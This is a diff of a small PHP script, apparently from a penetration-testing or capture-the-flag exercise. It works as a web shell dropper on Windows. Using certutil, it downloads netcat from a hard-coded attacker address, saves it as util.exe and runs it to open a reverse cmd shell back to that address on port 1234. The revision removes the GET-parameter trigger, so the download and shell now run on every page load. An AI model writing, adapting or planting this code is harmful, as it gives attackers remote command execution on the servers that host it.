@@ -1,15 +1,17 @@
 <?php
 
-//if necessary pass get to download nc from the attacker 
-if ($_GET["get"]) {system("certutil.exe -urlcache -f http://10.9.2.142:8000/nc.exe util.exe");}
+$atk_IP = "10.9.2.142";
+
+system("certutil.exe -urlcache -f http://" .$atk_IP. ":8000/nc.exe util.exe");
+//should get: download...**** Online **** CertUtil: -URLCache command completed successfully. 
+
+ if(file_exists("./util.exe")){
+	//echo "<br>util exists";
+	system("util.exe ".$atk_IP." 1234 -e cmd");
+ }
 
 else {
-	 //check if exists
-	 if(file_exists("./util.exe")){
-		 echo "Util exists";
-		 //execute the reverse shell
-		 system("util.exe 10.9.2.142 1234 -e cmd");
- }
+	echo "I was not able to download util file";
 }
 
 ?>
